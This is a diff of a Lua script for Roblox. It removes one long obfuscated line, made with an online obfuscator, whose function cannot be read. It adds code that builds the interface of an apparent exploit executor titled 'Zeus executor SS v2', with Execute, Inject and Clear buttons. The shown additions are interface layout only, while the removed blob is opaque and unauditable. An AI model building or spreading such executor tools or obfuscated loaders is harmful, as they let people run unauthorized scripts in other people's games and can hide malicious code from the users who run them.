@@ -1,1 +1,634 @@
---[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local a={"\065\100\109\080\121\065\084\086\085\073\101\103\068\073\116\061";"\115\114\076\087\068\122\076\087\106\065\084\086\106\054\077\111","\085\122\104\043\106\122\069\075";"\084\097\080\054\116\087\077\077\071\111\055\043\116\100\097\049\106\043\061\061";"\071\065\070\054\106\107\076\108\084\065\084\077\052\110\101\087\069\105\061\061";"\121\065\089\066\068\049\117\061";"\076\073\101\080\115\073\076\066\117\097\084\111\085\073\076\113\085\073\076\055\117\102\061\061";"\068\122\101\087\071\083\061\061";"\081\073\081\114\069\100\099\066\069\074\084\110\102\113\089\072\057\108\116\061","\076\054\085\072\121\113\069\075\110\073\086\073","\081\116\085\075\081\122\099\090\076\111\069\107\084\097\100\119\071\074\106\061","\065\100\109\120\106\043\061\061","\085\108\085\113\102\087\098\043\081\097\069\084\069\087\104\107\088\102\061\061";"\068\073\076\047","\088\105\061\061","\057\110\102\104\122\113\069\078\110\097\043\114\071\073\081\077","\085\073\101\103\068\073\116\061";"\065\100\109\098\121\122\072\061";"\084\113\086\116\106\054\081\049\110\054\098\061","\106\120\111\087\121\102\061\061","\110\122\100\106\085\049\085\070\068\073\080\076\081\097\104\073","\068\074\117\061","\084\054\121\066\116\110\086\066\122\108\085\101\110\113\117\061";"\106\114\109\047\106\114\101\087";"\115\054\076\080\068\049\121\111";"";"\115\049\084\066\071\122\104\120","\068\073\109\086\121\108\069\087\115\054\111\047\121\043\061\061";"\101\075\114\054\043\076\104\085\086\071\075\048\122\109\122\072\102\078\077\053\055\079\085\088\116\056\105\079\107\085\065\111\100\101\067\069\112\050\122\110\048\048\053\052","\085\073\109\047\085\122\100\103\121\065\117\061";"\071\076\106\061";"\068\074\097\061";"\115\054\101\047\121\073\109\080";"\106\114\086\086\115\105\061\061","\057\076\084\117\115\097\069\119\085\108\086\103\088\097\077\067\081\073\112\061";"\121\049\069\100\106\105\061\061";"\085\108\076\107\115\087\104\081\068\087\101\086\052\073\084\047\116\110\105\061","\121\054\077\067\068\049\117\061";"\115\073\069\086\068\073\043\061";"\065\100\109\099\068\054\084\111\052\083\061\061";"\057\111\076\097\069\113\097\077\102\054\109\102\121\116\069\120\085\116\105\061";"\085\073\109\107\085\108\089\099\068\054\115\061";"\121\114\101\080\121\102\061\061";"\121\114\100\086\085\073\069\078","\088\103\105\111\121\082\078\099\088\105\061\061";"\084\073\121\104\122\074\101\078\102\122\086\077\084\073\080\070","\057\108\084\087\115\097\085\111\085\083\061\061"}local function X(X)return a[X-(805204+-746415)]end for X,c in ipairs({{360923-360922;-215922-(-215969)};{-189515-(-189516),-866278+866281};{-514313-(-514317);-486236-(-486283)}})do while c[308431-308430]<c[-929412+929414]do a[c[401105-401104]],a[c[-312209+312211]],c[868147-868146],c[467764-467762]=a[c[-98155+98157]],a[c[-1038507-(-1038508)]],c[-544490+544491]+(-497994+497995),c[-130947+130949]-(-293160-(-293161))end end do local X={y=661610+-661585,s=15594-15566;G=-569328-(-569354),K=-621543+621586;J=-365996-(-365999);["\050"]=32673+-32658;l=-47299+47306,g=701256-701222;t=-217785+217805,j=-719420-(-719444),w=236415+-236373;z=-603786+603808,S=-64310+64310;u=923032-923024,["\057"]=70177-70159;F=-643062-(-643063),v=-994105-(-994167);["\051"]=-628481-(-628491);["\047"]=-832436-(-832482);U=-795430+795459;x=578083+-578044;p=-50855-(-50915);k=888867-888816;["\043"]=461614-461566;a=-232881+232885,I=472394-472388,i=924376-924344;A=839155+-839132;T=698072+-698055;R=810870+-810868,o=799081-799044,q=553712-553677,H=927763+-927707,D=239161+-239134,P=-943604+943649;d=-235517-(-235570);C=827186-827139,V=850464+-850431,["\052"]=-517196-(-517226);h=659479-659422,M=-471579+471628,b=-837529+837573,r=440538+-440484;N=-864212-(-864252);["\056"]=-350462+350525,["\048"]=-35355+35413,X=248104-248090,B=380188+-380138,m=1043353-1043292,f=412249-412233,["\053"]=796885+-796854;Z=-43131+43142,E=857541+-857528;O=199670-199611;c=617009-616968;n=-514574-(-514593);["\055"]=518661-518625;L=801590+-801569,["\049"]=986541-986486;Q=-904239+904251;Y=461069+-461060,e=660017-660012;W=-447441+447493;["\054"]=-345437+345475}local c=type local B=math.floor local V=table.insert local m=string.len local r=string.sub local K=table.concat local L=a local A=string.char for a=130910+-130909,#L,-435427-(-435428)do local I=L[a]if c(I)=="\115\116\114\105\110\103"then local c=m(I)local o={}local l=106598-106597 local S=570267-570267 local i=-901163+901163 while l<=c do local a=r(I,l,l)local m=X[a]if m then S=S+m*(239671+-239607)^((-145300+145303)-i)i=i+(783929-783928)if i==778378+-778374 then i=-625134-(-625134)local a=B(S/(672529-606993))local X=B((S%(-6532+72068))/(446804-446548))local c=S%(-437486-(-437742))V(o,A(a,X,c))S=615747+-615747 end elseif a=="\061"then V(o,A(B(S/(765122-699586))))if l>=c or r(I,l+(-622321+622322),l+(-975972+975973))~="\061"then V(o,A(B((S%(-287574-(-353110)))/(524638+-524382))))end break end l=l+(133140+-133139)end L[a]=K(o)end end end return(function(a,B,V,m,r,K,L,U,u,I,D,T,g,S,A,H,c,v,o,i,l,q)v,o,H,T,A,l,i,U,D,c,q,g,I,S,u=function(a)I[a]=I[a]-(918460-918459)if 1011685-1011685==I[a]then I[a],A[a]=nil,nil end end,function()l=l+(-155378+155379)I[l]=-375636-(-375637)return l end,function(a,X)local B=S(X)local V=function(V,m,r,K,L)return c(a,{V,m,r;K,L},X,B)end return V end,function(a,X)local B=S(X)local V=function()return c(a,{},X,B)end return V end,{},399630-399630,function(a)local X,c=229005+-229004,a[544475-544474]while c do I[c],X=I[c]-(-19614+19615),(213682-213681)+X if-670974-(-670974)==I[c]then I[c],A[c]=nil,nil end c=a[X]end end,function(a,X)local B=S(X)local V=function(V,m,r,K)return c(a,{V,m,r;K},X,B)end return V end,function(a,X)local B=S(X)local V=function(...)return c(a,{...},X,B)end return V end,function(c,V,m,r)local L,j,l,w,n,O,k,Y,S,z,f,E,N,G,F,D,I,h,y,M,d,W,e,i,p,J,P,Q,Z,x,C,b,R,t while c do if c<714585+6808332 then if c<2692369-(-525321)then if c<500379-(-1046259)then if c<534541-(-317863)then if c<-388425-(-985725)then if c<-125696-(-632971)then if c<-5427-(-224370)then c=A[m[-509940+509947]]c=c and-379527+12763356 or 5314429-294836 else J=t G=X(69389-10570)W=a[G]G=X(200419-141607)Z=W[G]W=Z(I,J)Z=A[m[-202074+202080]]G=Z()J=nil F=W+G f=F+Q F=1029732-1029476 z=f%F Q=z G=154630-154629 F=S[l]W=Q+G c=56549+12631837 Z=i[W]f=F..Z S[l]=f end else I=nil c=65938+-24695 A[m[967095+-967090]]=L end else if c<433863-(-262835)then F=-871815+871816 N=#z f=i(F,N)c=685891+6773392 F=Q(z,f)N=A[h]b=759645-759644 k=F-b f=nil w=P(k)N[F]=w F=nil else f=F c=1444999-(-758534)b=f z[f]=b f=nil end end else if c<939169-(-182469)then if c<1406509-373155 then I=V l=o()S=X(379288-320469)i=o()c=true A[l]=c L=a[S]S=X(792851-734015)D=o()J=U(477425+16264387,{D})c=L[S]S=o()A[S]=c c=q(867326+14328935,{})A[i]=c P=X(-108444-(-167275))c=false A[D]=c Q=a[P]P=Q(J)c=P and-199321+3340236 or 403970+11177154 L=P else L=X(-40170+98984)c=a[L]I=X(699314-640490)L=a[I]I=X(273193-214369)a[I]=c c=714290+5845067 I=X(344887-286073)a[I]=L I=A[m[-29180+29181]]l=I()end else if c<-238486+1654722 then d=A[l]c=d and 10858463-353590 or 844979-(-693799)L=d else c=13966417-(-28873)A[l]=L end end end else if c<-317910+2498040 then if c<630398+1448977 then if c<1088538-(-792062)then if c<538541+1243903 then c=-448762+13237464 else I=A[m[-1032057+1032058]]L=#I I=559515+-559515 c=L==I c=c and-474169+9305487 or-493597+12198074 end else L={l}c=a[X(118066-59237)]end else if c<1293831-(-858309)then n=o()f=T(-979847+16925555,{})z=X(693153-634322)t=105044+-105041 A[n]=L j=47373-47308 c=A[P]L=c(t,j)t=o()G=X(280062+-221228)c=-241389-(-241389)A[t]=L L=a[z]j=c c=15584-15584 h=c z={L(f)}c={B(z)}z=c L=98144+-98142 c=z[L]L=X(603363+-544541)f=c c=a[L]F=A[S]W=a[G]G=W(f)W=X(171742+-112952)Z=F(G,W)F={Z()}L=c(B(F))F=o()A[F]=L Z=A[t]W=Z L=-836216-(-836217)Z=728004+-728003 G=Z c=3986887-640604 Z=-985221+985221 N=G<Z Z=L-G else N=X(-920458-(-979272))c=a[N]N=X(637607-578783)a[N]=c c=981071+14012644 end end else if c<584759+1785253 then if c<2010580-(-260161)then b=not k F=F+w f=F<=N f=b and f b=F>=N b=k and b f=b or f b=159288-(-572744)c=f and b f=17437803-814857 c=c or f else z=X(-490476+549285)c=15933803-(-159576)h=a[z]z=X(-982346+1041141)j=h[z]n=j end else if c<266102+2750507 then c=U(-307702+13412607,{i})W={c()}L={B(W)}c=a[X(690296+-631499)]else Q=A[D]L=Q c=10953010-(-628114)end end end end else if c<7114531-924022 then if c<56781+3876145 then if c<-409085+4202000 then if c<-1025476+4475925 then if c<206470+3078722 then y=-913994-(-913995)E=x[y]d=E c=6741464-(-1027644)else Z=Z+G w=not N L=Z<=W L=w and L w=Z>=W w=N and w L=w or L w=10483860-(-306189)c=L and w L=3405539-(-398427)c=c or L end else A[l]=Z c=A[l]c=c and 1321076-(-446221)or-646251+7724187 end else if c<-422387+4291642 then W=A[l]Z=W c=W and 12234353-763030 or-383756+4172701 else E=A[l]c=E and 3973496-694183 or 972993+6796115 d=E end end else if c<948697+4013866 then if c<-435270+4830811 then G=-1006570-(-1006571)N=-77501-(-77507)c=A[P]W=c(G,N)c=X(-653218-(-712032))a[c]=W N=X(65233+-6419)G=a[N]N=-459017+459019 c=G>N c=c and 687956+9740882 or 1220719-(-939424)else L=d c=E c=-28366+1567144 end else if c<94010+5312019 then c={}l=-735671-(-735672)I=c S=A[m[-79838+79847]]i=S S=611073+-611072 D=S c=14163233-(-592335)S=299686+-299686 Q=D<S S=l-D else c=13818714-826078 end end end else if c<539476+6166299 then if c<5606865-(-978150)then if c<301985+6241792 then if c<-479659+6835367 then c=1409873-(-501822)else c=38022+471609 S=A[m[41820+-41814]]l=S==I L=l end else c=true c=c and 1674051-552564 or 14750822-641381 end else if c<929778+5685794 then t=X(971217-912422)n=a[t]L=n c=2504019-406336 else c=A[m[99516+-99515]]J=-469981-(-469981)l=S n=-180888+181143 P=c(J,n)I[l]=P l=nil c=15546831-791263 end end else if c<7455529-380635 then if c<832810+6151754 then p=-411429-(-411431)M=x[p]p=A[e]y=M==p d=y c=4481828-(-459083)else Q=nil i=nil P=nil c=488461+1423234 end else if c<84953+6995978 then c=true c=1856427-(-799785)else F=#z N=-458666-(-458666)f=F==N c=f and 12559537-968090 or 662378-(-19561)end end end end end else if c<297319+12620092 then if c<10850290-(-572113)then if c<10995679-543842 then if c<8667370-(-220785)then if c<7280406-(-629488)then if c<7522080-(-121438)then S=297523+-297522 l=A[m[968420+-968417]]I=l~=S c=I and 261684+12677310 or 276245+15779836 else A[l]=d O=383749-383748 p=A[Y]M=p+O y=x[M]E=j+y y=894553-894297 c=E%y j=c M=A[b]y=h+M M=729548-729292 E=y%M c=855958+13139332 h=E end else S=-597435-(-597452)l=A[m[-234159-(-234161)]]I=l*S l=418214+33316968995571 L=I+l I=35184372970407-881575 c=L%I A[m[-441168+441170]]=c I=A[m[953545+-953542]]l=724215+-724214 c=16340876-284795 L=I~=l end else if c<-868259+10842289 then c=A[m[12144+-12143]]I=V[-951767+951768]S=c l=V[334507-334505]c=S[l]c=c and 5365180-(-974684)or-1019664+16097010 else G=X(-819620+878454)w=X(421545-362721)c=a[G]N=a[w]G=c(N)c=X(134747-75933)a[c]=G c=15472025-478310 end end else if c<11392448-848076 then if c<670490+9838556 then p=-46190-(-46191)M=x[p]E=c p=false y=M==p c=y and 216159+6673653 or-342596+5283507 d=y else c=true c=c and 6482663-451832 or 91037+2565175 end else if c<582948+10353423 then k=X(918710+-859910)w=o()A[w]=Z L=a[k]b=777714+-777614 k=X(-27007-(-85832))Y=-37015-(-37270)c=L[k]k=-833486+833487 L=c(k,b)k=o()b=573374-573374 A[k]=L c=A[P]L=c(b,Y)b=o()Y=390479-390478 x=-877215+877217 A[b]=L c=A[P]R=A[k]C=-200742-(-210742)e=-1020827-(-1020828)L=c(Y,R)O=857758+-857758 Y=o()A[Y]=L L=A[P]R=L(e,x)L=-266267+266268 y=X(-881314-(-940148))x=X(109885+-51078)c=R==L L=X(402745-343955)R=o()A[R]=c E=a[y]M=A[P]p={M(O,C)}y=E(B(p))E=X(632888+-574081)d=y..E e=x..d c=X(311735-252907)c=f[c]c=c(f,L,e)e=o()x=X(-465111+523942)A[e]=c L=a[x]d=g(12343827-(-571150),{P;w;t;S;l;F,R,e,k,Y,b,n})x={L(d)}c={B(x)}x=c c=A[R]c=c and 398706-(-994234)or 247983+3652467 else L=49075+11562323 S=-754560+7580639 l=X(-887897+946712)I=l^S c=L-I I=c L=X(-337009-(-395811))c=L/I L={c}c=a[X(-428208-(-487009))]end end end else if c<12487614-167664 then if c<10741856-(-844076)then if c<10708537-(-873703)then if c<720034+10822606 then c=980556+2808389 W=j==h Z=W else P=X(89806+-31006)h=X(-150790-(-209599))Q=L J=X(806981-748172)L=a[P]P=X(87655+-28830)c=L[P]P=o()A[P]=c L=a[J]J=X(400924+-342108)c=L[J]J=c t=c j=a[h]c=j and 2131133-(-146418)or-1046483+17139862 n=j end else c=17503059-942868 l=A[m[-118383+118385]]S=A[m[4353-4350]]I=l==S L=I end else if c<124395+11568355 then J=nil f={}w=o()j=nil F=o()R=X(508067+-449235)k=X(787514-728720)A[F]=f L={}P=nil N=H(2816354-999797,{F,n,t;D})f=o()A[f]=N N={}z=nil x=X(-126709-(-185502))A[w]=N b={}y=nil N=a[k]e=A[w]c=a[X(438443-379616)]i=nil Y={[R]=e;[x]=y}P=X(50489+8346)k=N(b,Y)S=k N=u(9716493-327183,{w,F,h,n,t,f})j=746925+32301357602068 f=v(f)n=v(n)D=v(D)t=v(t)l=N w=v(w)D=X(-490092+548912)h=v(h)i=a[D]F=v(F)t=X(-504084+562905)Q=nil Q=a[P]n=l(t,j)J=S[n]S=nil l=nil n=X(-39812+98604)n=Q[n]P={n(Q,J)}D=i(B(P))i=D()else S=X(995320+-936511)l=a[S]S=X(79495+-20678)I=l[S]S=A[m[-788569+788570]]c=a[X(603735-544944)]l={I(S)}L={B(l)}end end else if c<12236569-(-456418)then if c<232265+12429852 then I=X(97478+-38680)S=-731574+731574 c=a[I]l=A[m[485302+-485294]]I=c(l,S)c=-923496+5943089 else z=not h t=t+j J=t<=n J=z and J z=t>=n z=h and z J=z or J z=5555+498107 c=J and z J=389198+6682699 c=c or J end else if c<-171261+12976576 then z=nil P=v(P)i=v(i)f=nil D=v(D)t=v(t)S=v(S)Q=nil j=nil F=v(F)l=v(l)h=nil z={}S=nil P=X(-736831-(-795631))j={}Q=X(79072+-20272)l=nil D=a[Q]Q=X(677558-618728)n=v(n)i=D[Q]J=nil D=o()A[D]=i Q=a[P]t=o()P=X(114409-55584)f=401154+-401153 i=Q[P]J=X(763605+-704796)n=X(-532369+591188)P=a[J]J=X(-459226+518043)Q=P[J]J=a[n]n=X(989254+-930428)P=J[n]F=-608706-(-608962)n=o()N=F h=o()J=-669039+669039 A[n]=J J=447050-447048 A[t]=J F=-457583-(-457584)w=F J={}A[h]=j F=546589-546589 j=-23936+23936 c=3101945-898412 k=w<F F=f-w else l=A[m[23811-23810]]D=-54210+54212 i=-779171+779172 S=l(i,D)l=725277-725276 I=S==l c=I and 16376247-(-183944)or 104951+11477607 L=I end end end end else if c<250096+14754797 then if c<14209297-146609 then if c<-589011+13806789 then if c<13158584-105281 then if c<13508742-517577 then j=945628-945615 S=537450+-537418 n=502001+-501999 l=A[m[705203+-705200]]I=l%S i=A[m[-275255-(-275259)]]P=A[m[213822+-213820]]f=A[m[-117955-(-117958)]]z=f-I f=-252733-(-252765)h=z/f t=j-h J=n^t Q=P/J D=i(Q)i=4294220789-(-746507)J=920215+-920214 n=-171349-(-171605)S=D%i D=-299043+299045 i=D^I l=S/i i=A[m[-24665-(-24669)]]P=l%J J=-226266+4295193562 Q=P*J P=146340-80804 j=620241-619985 D=i(Q)i=A[m[158206+-158202]]Q=i(l)S=D+Q D=706442+-640906 i=S%D I=nil l=nil Q=S-i D=Q/P P=-241188-(-241444)Q=i%P S=nil J=i-Q P=J/n n=20193+-19937 J=D%n t=D-J n=t/j i=nil t={Q;P;J,n}J=nil c=391659+11312818 A[m[83364-83363]]=t n=nil P=nil D=nil Q=nil else c=true c=c and 3024894-(-996769)or 213105+14052016 end else c=243816+6315541 end else if c<-628681+14413040 then L=X(-826772+885594)J=X(-153169+212000)n=T(694801+10263442,{})c=a[L]i=X(-562221+621055)I=A[m[-38651+38655]]S=a[i]P=a[J]J={P(n)}Q={B(J)}P=450149-450147 D=Q[P]i=S(D)S=X(246696+-187906)l=I(i,S)I={l()}L=c(B(I))I=L l=A[m[326817+-326812]]c=l and 584033+5946379 or-25743-(-535374)L=l else b=v(b)w=v(w)x=nil c=3183571-(-162712)e=v(e)R=v(R)k=v(k)Y=v(Y)end end else if c<14425466-(-77373)then if c<13197982-(-979071)then L={}c=a[X(353383+-294580)]else c=a[X(261900+-203087)]L={}end else if c<811683+14119872 then S=S+D l=S<=i P=not Q l=P and l P=S>=i P=Q and P l=P or l P=5759555-(-885171)c=l and P l=16242948-512836 c=c or l else c=13966649-974013 end end end else if c<-1006327+17099101 then if c<1017281+14913426 then if c<576421+14758297 then if c<-618680+15813944 then D=35184372963795-874963 P=1026776+-1026521 t=587539-587538 c={}A[m[255276-255274]]=c L=A[m[-546402+546405]]i=L j=t L=l%D c=13196661-508275 t=3915-3915 J=X(-655723+714542)A[m[-510803+510807]]=L Q=l%P P=1001566+-1001564 D=Q+P A[m[723143-723138]]=D P=a[J]J=X(-1470-(-60276))Q=P[J]P=Q(I)h=j<t Q=X(380391+-321573)n=P S[l]=Q J=749438+-749437 Q=97170-96990 t=J-j else L=X(-623495-(-682293))c=a[L]I=X(-992750+1051549)L=c(I)c=a[X(847666-788861)]L={}end else c=A[m[69186-69176]]l=A[m[-303343-(-303354)]]I[c]=l c=A[m[-518281-(-518293)]]l={c(I)}L={B(l)}c=a[X(625951-567155)]end else if c<208443+15740767 then L=12937153-(-550962)l=X(-340264+399075)S=14234942-(-772496)I=l^S c=L-I L=X(-726763+785586)I=c c=L/I L={c}c=a[X(767316+-708508)]else S=-515015-(-515265)l=A[m[867417-867414]]I=l*S l=-107724+107981 c=6534922-(-1000655)L=I%l A[m[-275325-(-275328)]]=L end end else if c<-731252+17301736 then if c<15735819-(-494844)then c=t L=n c=n and 3009023-911340 or-311230+6897757 else c=L and 12381495-(-1000913)or-999755+1040998 end else if c<16616892-(-21933)then N=-685134-(-685134)F=#z f=F==N c=830831+-148892 else L={}c=true A[m[732063-732062]]=c c=a[X(626439-567606)]end end end end end end end c=#r return B(L)end,function(a,X)local B=S(X)local V=function(V)return c(a,{V},X,B)end return V end,function(a,X)local B=S(X)local V=function(V,m)return c(a,{V;m},X,B)end return V end,{},function(a)for X=263730-263729,#a,-309269-(-309270)do I[a[X]]=(667466+-667465)+I[a[X]]end if V then local c=V(true)local B=r(c)B[X(-167178+226010)],B[X(620846-562042)],B[X(247727-188917)]=a,i,function()return 595488-(-766211)end return c else return m({},{[X(1087540-1028736)]=i,[X(975303-916471)]=a;[X(-228096-(-286906))]=function()return 629220+732479 end})end end,function(a,X)local B=S(X)local V=function(V,m,r)return c(a,{V;m;r},X,B)end return V end return(D(254895+752446,{}))(B(L))end)(getfenv and getfenv()or _ENV,unpack or table[X(-654043+712838)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+local LMG2L = {};
+
+LMG2L["ZeusGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ZeusGui_1"]["IgnoreGuiInset"] = true;
+LMG2L["ZeusGui_1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
+LMG2L["ZeusGui_1"]["Name"] = [[ZeusGui]];
+LMG2L["ZeusGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+LMG2L["ZeusGui_1"]["ResetOnSpawn"] = false;
+
+
+LMG2L["Main_2"] = Instance.new("Frame", LMG2L["ZeusGui_1"]);
+LMG2L["Main_2"]["Visible"] = false;
+LMG2L["Main_2"]["BorderSizePixel"] = 0;
+LMG2L["Main_2"]["BackgroundColor3"] = Color3.fromRGB(24, 24, 24);
+LMG2L["Main_2"]["ClipsDescendants"] = true;
+LMG2L["Main_2"]["Size"] = UDim2.new(0, 658, 0, 326);
+LMG2L["Main_2"]["Position"] = UDim2.new(0, 118, 0, 68);
+LMG2L["Main_2"]["Name"] = [[Main]];
+
+
+LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["Main_2"]);
+
+
+
+LMG2L["MainIMG_4"] = Instance.new("ImageLabel", LMG2L["Main_2"]);
+LMG2L["MainIMG_4"]["BorderSizePixel"] = 0;
+LMG2L["MainIMG_4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["MainIMG_4"]["Image"] = [[rbxassetid://127844177930647]];
+LMG2L["MainIMG_4"]["Size"] = UDim2.new(0, 24, 0, 24);
+LMG2L["MainIMG_4"]["BackgroundTransparency"] = 1;
+LMG2L["MainIMG_4"]["Name"] = [[MainIMG]];
+LMG2L["MainIMG_4"]["Position"] = UDim2.new(0, 16, 0, 10);
+
+
+LMG2L["Title_5"] = Instance.new("TextLabel", LMG2L["Main_2"]);
+LMG2L["Title_5"]["TextWrapped"] = true;
+LMG2L["Title_5"]["BorderSizePixel"] = 0;
+LMG2L["Title_5"]["TextSize"] = 18;
+LMG2L["Title_5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["Title_5"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
+LMG2L["Title_5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Title_5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Title_5"]["BackgroundTransparency"] = 1;
+LMG2L["Title_5"]["Size"] = UDim2.new(0, 390, 0, 28);
+LMG2L["Title_5"]["Text"] = [[Zeus executor SS v2]];
+LMG2L["Title_5"]["Name"] = [[Title]];
+LMG2L["Title_5"]["Position"] = UDim2.new(0, 50, 0, 8);
+
+
+LMG2L["Rasdel_6"] = Instance.new("Frame", LMG2L["Main_2"]);
+LMG2L["Rasdel_6"]["BorderSizePixel"] = 0;
+LMG2L["Rasdel_6"]["BackgroundColor3"] = Color3.fromRGB(47, 47, 47);
+LMG2L["Rasdel_6"]["Size"] = UDim2.new(0, 658, 0, 2);
+LMG2L["Rasdel_6"]["Position"] = UDim2.new(0, 0, 0, 42);
+LMG2L["Rasdel_6"]["Name"] = [[Rasdel]];
+
+
+LMG2L["Rasdel_7"] = Instance.new("Frame", LMG2L["Main_2"]);
+LMG2L["Rasdel_7"]["BorderSizePixel"] = 0;
+LMG2L["Rasdel_7"]["BackgroundColor3"] = Color3.fromRGB(47, 47, 47);
+LMG2L["Rasdel_7"]["Size"] = UDim2.new(0, 1, 0, 284);
+LMG2L["Rasdel_7"]["Position"] = UDim2.new(0, 172, 0, 42);
+LMG2L["Rasdel_7"]["Name"] = [[Rasdel]];
+
+
+LMG2L["Exe_8"] = Instance.new("TextButton", LMG2L["Main_2"]);
+LMG2L["Exe_8"]["TextWrapped"] = true;
+LMG2L["Exe_8"]["BorderSizePixel"] = 0;
+LMG2L["Exe_8"]["TextXAlignment"] = Enum.TextXAlignment.Right;
+LMG2L["Exe_8"]["TextSize"] = 24;
+LMG2L["Exe_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Exe_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Exe_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Exe_8"]["BackgroundTransparency"] = 1;
+LMG2L["Exe_8"]["Size"] = UDim2.new(0, 118, 0, 40);
+LMG2L["Exe_8"]["Text"] = [[Execute]];
+LMG2L["Exe_8"]["Name"] = [[Exe]];
+LMG2L["Exe_8"]["Position"] = UDim2.new(0, 26, 0, 50);
+
+
+LMG2L["ImageLabel_9"] = Instance.new("ImageLabel", LMG2L["Exe_8"]);
+LMG2L["ImageLabel_9"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageLabel_9"]["Image"] = [[rbxassetid://82603095454739]];
+LMG2L["ImageLabel_9"]["Size"] = UDim2.new(0, 40, 0, 40);
+LMG2L["ImageLabel_9"]["BackgroundTransparency"] = 1;
+
+
+LMG2L["Clear_a"] = Instance.new("TextButton", LMG2L["Main_2"]);
+LMG2L["Clear_a"]["TextWrapped"] = true;
+LMG2L["Clear_a"]["BorderSizePixel"] = 0;
+LMG2L["Clear_a"]["TextXAlignment"] = Enum.TextXAlignment.Right;
+LMG2L["Clear_a"]["TextSize"] = 24;
+LMG2L["Clear_a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Clear_a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Clear_a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Clear_a"]["BackgroundTransparency"] = 1;
+LMG2L["Clear_a"]["Size"] = UDim2.new(0, 118, 0, 40);
+LMG2L["Clear_a"]["Text"] = [[Clear]];
+LMG2L["Clear_a"]["Name"] = [[Clear]];
+LMG2L["Clear_a"]["Position"] = UDim2.new(0, 26, 0, 96);
+
+
+LMG2L["ImageLabel_b"] = Instance.new("ImageLabel", LMG2L["Clear_a"]);
+LMG2L["ImageLabel_b"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageLabel_b"]["Image"] = [[rbxassetid://72956853823861]];
+LMG2L["ImageLabel_b"]["Size"] = UDim2.new(0, 40, 0, 40);
+LMG2L["ImageLabel_b"]["BackgroundTransparency"] = 1;
+
+
+LMG2L["Inject_e"] = Instance.new("TextButton", LMG2L["Main_2"]);
+LMG2L["Inject_e"]["TextWrapped"] = true;
+LMG2L["Inject_e"]["BorderSizePixel"] = 0;
+LMG2L["Inject_e"]["TextXAlignment"] = Enum.TextXAlignment.Right;
+LMG2L["Inject_e"]["TextSize"] = 24;
+LMG2L["Inject_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Inject_e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Inject_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Inject_e"]["BackgroundTransparency"] = 1;
+LMG2L["Inject_e"]["Size"] = UDim2.new(0, 118, 0, 40);
+LMG2L["Inject_e"]["Text"] = [[Inject]];
+LMG2L["Inject_e"]["Name"] = [[Inject]];
+LMG2L["Inject_e"]["Position"] = UDim2.new(0, 26, 0, 142);
+
+
+LMG2L["ImageLabel_f"] = Instance.new("ImageLabel", LMG2L["Inject_e"]);
+LMG2L["ImageLabel_f"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageLabel_f"]["Image"] = [[rbxassetid://92148716143068]];
+LMG2L["ImageLabel_f"]["Size"] = UDim2.new(0, 40, 0, 40);
+LMG2L["ImageLabel_f"]["BackgroundTransparency"] = 1;
+
+
+LMG2L["StatusLabel_10"] = Instance.new("TextLabel", LMG2L["Main_2"]);
+LMG2L["StatusLabel_10"]["BorderSizePixel"] = 0;
+LMG2L["StatusLabel_10"]["TextSize"] = 18;
+LMG2L["StatusLabel_10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["StatusLabel_10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["StatusLabel_10"]["TextColor3"] = Color3.fromRGB(154, 154, 154);
+LMG2L["StatusLabel_10"]["BackgroundTransparency"] = 1;
+LMG2L["StatusLabel_10"]["Size"] = UDim2.new(0, 150, 0, 26);
+LMG2L["StatusLabel_10"]["Text"] = [[Status: Client side]];
+LMG2L["StatusLabel_10"]["Name"] = [[StatusLabel]];
+LMG2L["StatusLabel_10"]["Position"] = UDim2.new(0, 4, 0, 296);
+
+
+LMG2L["Panel_11"] = Instance.new("TextBox", LMG2L["Main_2"]);
+LMG2L["Panel_11"]["Name"] = [[Panel]];
+LMG2L["Panel_11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["Panel_11"]["BorderSizePixel"] = 0;
+LMG2L["Panel_11"]["TextWrapped"] = true;
+LMG2L["Panel_11"]["TextSize"] = 14;
+LMG2L["Panel_11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Panel_11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["Panel_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
